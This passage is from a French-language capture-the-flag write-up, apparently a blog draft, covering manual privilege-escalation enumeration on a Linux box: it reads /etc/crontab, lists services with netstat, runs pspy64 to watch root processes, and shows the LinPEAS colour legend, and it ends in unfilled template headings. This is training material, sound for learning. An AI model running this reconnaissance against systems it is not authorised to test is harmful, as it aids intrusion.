Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.

Les crons système peuvent être consultés avec :

```bash
cat /etc/crontab
```

### Analyse des services locaux
Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.

```
netstat -tulpn
```

### pspy64
Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.

cd /tmp
./pspy64

L’objectif est de repérer d’éventuelles tâches cron, scripts ou commandes exécutés automatiquement par root et qui pourraient être exploitables pour une escalade de privilèges.

Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
### Conclusion de l’énumération manuelle

### Analyse avec linpeas.sh
Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)

---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}